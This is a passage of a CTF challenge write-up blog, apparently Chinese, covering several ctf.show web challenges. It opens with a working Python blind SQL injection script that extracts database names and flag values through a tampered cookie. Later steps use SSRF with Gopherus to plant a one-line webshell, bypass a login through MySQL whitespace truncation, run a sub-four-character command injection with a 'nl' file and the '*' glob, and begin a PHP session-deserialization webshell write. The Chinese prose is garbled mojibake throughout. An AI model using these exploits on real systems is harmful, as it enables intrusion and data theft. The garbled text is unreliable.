<span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				payload = <span class="string">&quot;1&#x27; or (select (select table_name from information_schema.tables where table_schema=database() limit 3,1) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> +<span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">			<span class="comment">#print(payload)</span></span><br><span class="line">			payload = tamper(payload)</span><br><span class="line">			tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">			headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">			r =requests.get(url, headers=headers)</span><br><span class="line">			myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">			<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">				flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;tablename = &#x27;</span> + flag.lower())</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">				</span><br><span class="line"><span class="comment">#get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ColumnName</span>():</span><br><span class="line">	flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):           <span class="comment">#blind inject</span></span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				payload = <span class="string">&quot;1&#x27; or (select (select column_name from information_schema.columns where table_name=&#x27;FL2333G&#x27; limit 0,1) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> +<span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">			<span class="comment">#print(payload)</span></span><br><span class="line">			payload = tamper(payload)</span><br><span class="line">			tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">			headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">			r =requests.get(url, headers=headers)</span><br><span class="line">			myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">			<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">				flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;column name = &#x27;</span> + flag.lower())</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">				</span><br><span class="line"><span class="comment">#get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>():</span><br><span class="line">	flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">50</span>):           <span class="comment">#blind inject</span></span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				payload = <span class="string">&quot;1&#x27; or (select (select FLLLLLAG from FL2333G) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> +<span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">			<span class="comment">#print(payload)</span></span><br><span class="line">			payload = tamper(payload)</span><br><span class="line">			tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">			headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">			r =requests.get(url, headers=headers)</span><br><span class="line">			myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">			<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">				flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;flag = &#x27;</span> + flag.lower())</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;start database sql injection...&quot;</span>)</span><br><span class="line">databaseName_len()</span><br><span class="line">get_databaseName()</span><br><span class="line">get_tableName()</span><br><span class="line">get_ColumnName()</span><br><span class="line">get_value()</span><br></pre></td></tr></table></figure></div>
<h1 id="çº¢åŒ…é¢˜ç¬¬ä¹å¼¹"><a href="#çº¢åŒ…é¢˜ç¬¬ä¹å¼¹" class="headerlink" title="çº¢åŒ…é¢˜ç¬¬ä¹å¼¹"></a>çº¢åŒ…é¢˜ç¬¬ä¹å¼¹</h1><p><img src="https://pic1.imgdb.cn/item/67ac669fd0e0a243d4fe9960.png" alt="|425"><br>ç»™äº†ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œç‚¹å‡»loginä¼šè·³åˆ°ä¸€ä¸ªcheck.php,éšä¾¿å†™ç”¨æˆ·åå’Œå¯†ç ï¼Œå‘ç°æœ‰ç»™ä¸€ä¸ªreurlå‚æ•°<br>æ‰€ä»¥çŒœæµ‹æœ‰ssrf<br><img src="https://pic1.imgdb.cn/item/67ac66afd0e0a243d4fe996e.png"><br>è¿™é‡Œä½¿ç”¨ssrfä¸“ç”¨çš„å·¥å…·Gopherus <a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a><br>æˆ‘ç”¨çš„kaliå®‰è£…ï¼Œä¿®æ”¹äº†ä¸€ä¸‹install.sh </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">python3 -m pip install argparse --break-system-packages</span><br><span class="line">python3 -m pip install requests --break-system-packages</span><br><span class="line"><span class="built_in">chmod</span> +x gopherus.py</span><br><span class="line"><span class="built_in">ln</span> -sf $(<span class="built_in">pwd</span>)/gopherus.py /usr/local/bin/gopherus</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åå†™å…¥ä¸€å¥è¯æœ¨é©¬<br><img src="https://pic1.imgdb.cn/item/67ac6865d0e0a243d4fe9a42.png"><br>å¾—åˆ°poc,æŠŠpocåšä¸ªurlç¼–ç ï¼Œç„¶åç”¨bpå‘é€<br><img src="https://pic1.imgdb.cn/item/67ac67b0d0e0a243d4fe9a10.png"><br>ç”¨èšå‰‘è¿æ¥ä¹‹ååœ¨æ ¹ç›®å½•æ‰¾åˆ°flag<br><img src="https://pic1.imgdb.cn/item/67ac6855d0e0a243d4fe9a3c.png" alt="|475"></p>
<h1 id="çº¢åŒ…é¢˜-è‘µèŠ±å®å…¸"><a href="#çº¢åŒ…é¢˜-è‘µèŠ±å®å…¸" class="headerlink" title="çº¢åŒ…é¢˜ è‘µèŠ±å®å…¸"></a>çº¢åŒ…é¢˜ è‘µèŠ±å®å…¸</h1><p><img src="https://pic1.imgdb.cn/item/67ac6846d0e0a243d4fe9a38.png" alt="|525"><br>åˆæ˜¯ä¸€ä¸ªç™»å½•å¹³å°<br>æ³¨å†Œä¹‹åç™»å½•ç›´æ¥æ‹¿åˆ°flag<br><img src="https://pic1.imgdb.cn/item/67ac6867d0e0a243d4fe9a43.png"></p>
<h1 id="çº¢åŒ…é¢˜-è¾Ÿé‚ªå‰‘è°±"><a href="#çº¢åŒ…é¢˜-è¾Ÿé‚ªå‰‘è°±" class="headerlink" title="çº¢åŒ…é¢˜ è¾Ÿé‚ªå‰‘è°±"></a>çº¢åŒ…é¢˜ è¾Ÿé‚ªå‰‘è°±</h1><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·çš„ç™»å½•ç•Œé¢,ä½†æ˜¯æ³¨å†Œä¹‹åä¸èƒ½ç™»å½•ã€‚åœ¨urlä¸­è®¿é—®<a href="http://www.zipå¯ä»¥ä¸‹è½½æºä»£ç /">www.zipå¯ä»¥ä¸‹è½½æºä»£ç </a><br>checklogin.phpä»£ç ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line"><span class="operator">&lt;</span><span class="operator">?</span>php</span><br><span class="line">    require_once &#x27;<span class="operator">/</span>inc<span class="operator">/</span>inc.php&#x27;;</span><br><span class="line"></span><br><span class="line">    $user_name <span class="operator">=</span> trim($_POST[&#x27;user_name&#x27;]);</span><br><span class="line">    $user_password <span class="operator">=</span> trim($_POST[&#x27;user_password&#x27;]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/select|update|drop|union|and|or|sys|substr|sleep|from|where|0x|hex|bin|char|file|order|limit|by|<span class="char escape_">\`</span>|<span class="char escape_">\~</span>|<span class="char escape_">\!</span>|<span class="char escape_">\@</span>|<span class="char escape_">\#</span>|<span class="char escape_">\\</span>$|<span class="char escape_">\%</span>|<span class="char escape_">\^</span>|<span class="char escape_">\&amp;</span>|<span class="char escape_">\*</span>|<span class="char escape_">\(</span>|<span class="char escape_">\)</span>|<span class="char escape_">\ï¼ˆ</span>|<span class="char escape_">\ï¼‰</span>|<span class="char escape_">\-</span>|<span class="char escape_">\_</span>|<span class="char escape_">\+</span>|<span class="char escape_">\=</span>|<span class="char escape_">\&#123;</span>|<span class="char escape_">\[</span>|<span class="char escape_">\&#125;</span>|<span class="char escape_">\]</span>|<span class="char escape_">\;</span>|<span class="char escape_">\:</span>|<span class="char escape_">\&#x27;</span>|<span class="char escape_">\&quot;</span>|<span class="char escape_">\&lt;</span>|<span class="char escape_">\,</span>|<span class="char escape_">\&gt;</span>|<span class="char escape_">\.</span>|<span class="char escape_">\?</span>/i&quot;</span>, $user_name)) &#123;</span><br><span class="line">        die(<span class="string">&quot;stop hack!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/select|update|drop|union|and|or|sys|substr|sleep|from|where|0x|hex|bin|char|file|order|limit|by|<span class="char escape_">\`</span>|<span class="char escape_">\~</span>|<span class="char escape_">\!</span>|<span class="char escape_">\@</span>|<span class="char escape_">\#</span>|<span class="char escape_">\\</span>$|<span class="char escape_">\%</span>|<span class="char escape_">\^</span>|<span class="char escape_">\&amp;</span>|<span class="char escape_">\*</span>|<span class="char escape_">\(</span>|<span class="char escape_">\)</span>|<span class="char escape_">\ï¼ˆ</span>|<span class="char escape_">\ï¼‰</span>|<span class="char escape_">\-</span>|<span class="char escape_">\_</span>|<span class="char escape_">\+</span>|<span class="char escape_">\=</span>|<span class="char escape_">\&#123;</span>|<span class="char escape_">\[</span>|<span class="char escape_">\&#125;</span>|<span class="char escape_">\]</span>|<span class="char escape_">\;</span>|<span class="char escape_">\:</span>|<span class="char escape_">\&#x27;</span>|<span class="char escape_">\&quot;</span>|<span class="char escape_">\&lt;</span>|<span class="char escape_">\,</span>|<span class="char escape_">\&gt;</span>|<span class="char escape_">\.</span>|<span class="char escape_">\?</span>/i&quot;</span>, $user_password)) &#123;</span><br><span class="line">        die(<span class="string">&quot;stop hack!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data <span class="operator">=</span> $db<span class="operator">-&gt;</span>select(<span class="string">&quot;admin&quot;</span>, [<span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>], [<span class="string">&quot;username[=]&quot;</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&quot;admin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    foreach ($data as $d) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($d[&#x27;password&#x27;] <span class="operator">==</span><span class="operator">=</span> $user_password) &#123;</span><br><span class="line">            $_SESSION[&#x27;user&#x27;] <span class="operator">=</span> $user_name;</span><br><span class="line">            die(<span class="string">&quot;login success!&lt;br&gt;&lt;hr&gt;flag is $flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line"><span class="operator">?</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªä»£ç ä¸­å›ºå®šäº†ç”¨æˆ·åæ˜¯adminï¼Œè¿™é‡Œè¦ç”¨åˆ°sqlçš„whereç‰¹æ€§<br>åœ¨ MySQL ä¸­ï¼Œ<code>WHERE</code> å­å¥åœ¨æ¯”è¾ƒå­—ç¬¦ä¸²æ—¶ä¼šå¿½ç•¥å­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ã€‚ä¾‹å¦‚ï¼Œå½“æ‰§è¡Œ <code>SELECT * FROM table WHERE column = &#39;cs &#39;;</code> æ—¶ï¼ŒMySQL ä¼šå°†å…¶è§†ä¸º <code>&#39;cs&#39;</code> è¿›è¡Œæ¯”è¾ƒï¼Œåªè¦ <code>column</code> åˆ—çš„å€¼ä¸º <code>&#39;cs&#39;</code> å°±ä¼šåŒ¹é…æˆåŠŸã€‚è¿™ä¸€ç‰¹æ€§å¯ä»¥ç”¨äºç»•è¿‡ä¸€äº›è¾“å…¥è¿‡æ»¤æœºåˆ¶ã€‚</p>
<ul>
<li><p><strong>CHAR å’Œ VARCHAR åˆ—æœ‰æœ€å¤§é•¿åº¦é™åˆ¶</strong>ï¼šå½“ç»™ <code>CHAR</code> æˆ– <code>VARCHAR</code> åˆ—èµ‹å€¼æ—¶ï¼Œå¦‚æœå€¼çš„é•¿åº¦è¶…è¿‡äº†åˆ—çš„æœ€å¤§é•¿åº¦ï¼Œå°±ä¼šå¯¹å€¼è¿›è¡Œè£å‰ªä»¥ä½¿å…¶é€‚åˆåˆ—çš„é•¿åº¦ã€‚</p>
</li>
<li><p><strong>ä¸¥æ ¼ SQL æ¨¡å¼çš„å½±å“</strong>ï¼š</p>
<ul>
<li><strong>ä¸¥æ ¼æ¨¡å¼ä¸‹</strong>ï¼šå¦‚æœè¢«è£æ‰çš„å­—ç¬¦ä¸æ˜¯ç©ºæ ¼ï¼Œä¼šäº§ç”Ÿé”™è¯¯å¹¶ç¦ç”¨å€¼çš„æ’å…¥ã€‚</li>
<li><strong>éä¸¥æ ¼æ¨¡å¼ä¸‹</strong>ï¼šä¸ç®¡è¢«è£æ‰çš„å­—ç¬¦æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼šç›´æ¥æˆªæ–­å€¼ï¼Œä¸ä¼šäº§ç”Ÿé”™è¯¯ã€‚</li>
</ul>
</li>
</ul>
<p>ä½†æ˜¯å¦‚æœæˆ‘è¿™ä¸ªæ—¶å€™ç¦ç”¨äº†ä¸¥æ ¼ SQL æ¨¡å¼ï¼Œé‚£ä¹ˆå°±ä¼šç›´æ¥æˆªæ–­ï¼Œä¸ç®¡åé¢æ˜¯ä»€ä¹ˆï¼Œè¿™ä¸ªæ‰æ˜¯è¿™é“é¢˜çš„è§£æ³•ã€‚</p>
<p>è®¾ç½®éä¸¥æ ¼æ¨¡å¼ï¼Œé…ç½®æ–‡ä»¶åŠ ä¸ŠÂ <code>sql_mode =&quot;&quot;</code>Â å°±è¡Œ<br><img src="https://pic1.imgdb.cn/item/67ac68c2d0e0a243d4fe9a4f.png" alt="|500"><br>æ‰€ä»¥æ³¨å†Œçš„æ—¶å€™ç”¨æˆ·ç”¨adminç„¶åå¾ˆå¤šç©ºæ ¼ï¼Œå¯†ç éšä¾¿è¾“å…¥,è¿™æ ·å°±å¯ä»¥ç™»å½•admin<br><img src="https://pic1.imgdb.cn/item/67ac68c7d0e0a243d4fe9a50.png"></p>
<h1 id="ã€nlã€‘éš¾äº†"><a href="#ã€nlã€‘éš¾äº†" class="headerlink" title="ã€nlã€‘éš¾äº†"></a>ã€nlã€‘éš¾äº†</h1><p>é¢˜ç›®æºç ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;  </span><br><span class="line">    Â Â Â Â Â <span class="keyword">echo</span><span class="title function_ invoke__">Â shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span>&#123;  </span><br><span class="line">    Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;hack!!!&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œç”¨1ä¼ å…¥å‚æ•°ï¼Œä½†æ˜¯é•¿åº¦å°äº4ï¼Œå…ˆç”¨lsæŒ‡ä»¤çœ‹çœ‹æœ‰ä»€ä¹ˆæ–‡ä»¶ï¼Œå‘ç°flagæ–‡ä»¶ç‰¹åˆ«é•¿secretsecret_ctfshow_36dddddddddd.phpï¼Œè¿˜æœ‰ä¸€ä¸ªzzz.php<br>ç»“åˆé¢˜ç›®æ ‡é¢˜ï¼ŒçŒœæµ‹éœ€è¦ä½¿ç”¨nlæŒ‡ä»¤ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥ç”¨nl å› ä¸ºä¸èƒ½ç›´æ¥è¾“å…¥æ–‡ä»¶åè®©nlæ‰§è¡Œã€‚æ‰€ä»¥ç°åœ¨éœ€è¦ç”¨åˆ°linuxä¸­çš„ä¸€ä¸ªæŠ€å·§ï¼Œ<code>*</code>é€šé…ç¬¦ä¼šæ‰§è¡Œæ‰€æœ‰çš„æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp/aa]</span><br><span class="line">â””â”€# <span class="built_in">ls</span></span><br><span class="line">aÂ  <span class="built_in">nl</span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp/aa]</span><br><span class="line">â””â”€# *</span><br><span class="line">a: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure></div>
<p>æ¯”å¦‚æˆ‘è¿™é‡Œæœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œè¾“å…¥<code>*</code>ï¼Œlinuxå°±ä¼šæ‰§è¡Œ a  å’Œ nlï¼Œç°åœ¨æˆ‘ä»¬åªè¦è®©nlå†flagæ–‡ä»¶å‰é¢ï¼Œç„¶åç”¨<code>*</code>æ‰§è¡Œå°±å¥½ï¼Œæ‰€ä»¥å…ˆåˆ›å»ºä¸€ä¸ªnlæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">https</span>://<span class="number">09260</span>a7d-e390-<span class="number">4428</span>-<span class="number">87</span>a8-e800f51f3670.challenge.ctf.show/?<span class="number">1</span>=&gt;nl</span><br><span class="line"><span class="attribute">https</span>://<span class="number">09260</span>a7d-e390-<span class="number">4428</span>-<span class="number">87</span>a8-e800f51f3670.challenge.ctf.show/?<span class="number">1</span>=*</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ ·å°±å¯ä»¥é€šè¿‡æ‰§è¡Œnl çœ‹flagæ–‡ä»¶,ä½†æ˜¯è¿™é‡Œè¿˜æ˜¯æ²¡æ³•ç›´æ¥çœ‹ï¼Œæˆ‘ä»¬å°±æŠŠè¾“å‡ºçš„ç»“æœé‡å®šå‘åˆ°åˆ°ä¸€ä¸ªæ–‡ä»¶aä¸­<code>?1=*&gt;a</code><br>æœ€åè®¿é—®url&#x2F;aå°±å¯ä»¥å¾—åˆ°flag</p>
<h1 id="ä¸€åˆ‡çœ‹èµ·æ¥éƒ½é‚£ä¹ˆåˆæƒ…åˆç†"><a href="#ä¸€åˆ‡çœ‹èµ·æ¥éƒ½é‚£ä¹ˆåˆæƒ…åˆç†" class="headerlink" title="ä¸€åˆ‡çœ‹èµ·æ¥éƒ½é‚£ä¹ˆåˆæƒ…åˆç†"></a>ä¸€åˆ‡çœ‹èµ·æ¥éƒ½é‚£ä¹ˆåˆæƒ…åˆç†</h1><p>é¢˜ç›®æè¿°ï¼šç¨‹åºå‘˜äºŒé»‘ä¸´èµ°å‰æ¤å…¥äº†ä¸€ä¸ªåé—¨ï¼Œä½ èƒ½å¸®å…¬å¸æ‰¾å‡ºæ¥å—ï¼Ÿ<br><img src="https://pic1.imgdb.cn/item/67ac68dbd0e0a243d4fe9a54.png"><br>å¦‚æœéšä¾¿ç™»å½•ä¸€ä¸ªè´¦å·å¯†ç å°±ä¼šæç¤ºç™»å½•å¤±è´¥ï¼Œæ²¡æœ‰å…¶ä»–çš„å›æ˜¾. é¢˜ç›®æç¤ºå’Œåé—¨æœ‰å…³,è¿™é‡Œå†å»<a href="http://www.zipä¸‹è½½æºç /">www.zipä¸‹è½½æºç </a><br>index.php:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"> <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"> <span class="comment">//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">  <span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè®¾ç½®äº†ä¸€ä¸ªSESSIONå€¼limitï¼Œè¿™ä¸ªSESSIONæˆ‘ä»¬å¯ä»¥æ§åˆ¶ã€‚<code>æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡$_SESSIONçš„å€¼ä¼ é€’æˆ‘ä»¬çš„payloadå…¥æœåŠ¡å™¨çš„/tmp/sess_xxxç”Ÿæˆæˆ‘ä»¬æ„é€ çš„åºåˆ—åŒ–payload</code><br>inc.phpä¸­çš„å…³é”®ä»£ç ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">ini_set</span>(&#x27;display_errors&#x27;, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">ini_set</span>(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line"><span class="built_in">date_default_timezone_set</span>(&quot;Asia/Shanghai&quot;);</span><br><span class="line"><span class="built_in">session_start</span>();</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;ä½¿ç”¨&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;ç™»é™†&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;æˆåŠŸ&quot;</span>:<span class="string">&quot;å¤±è´¥&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>ä»£ç å®šä¹‰äº†ä¸€ä¸ªUserç±»ï¼Œå°†åˆ©ç”¨file_put_contents()å‡½æ•°å†™å…¥ç±»å±æ€§å€¼ï¼Œç°åœ¨æˆ‘ä»¬å°±è¦åˆ©ç”¨sessionè¿›è¡Œåºåˆ—åŒ–æ‰§è¡ŒUserç±»çš„file_put_contents()å‡½æ•°å†™å…¥ä¸€å¥è¯ï¼Œå¾—åˆ°flag<br>check.php:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
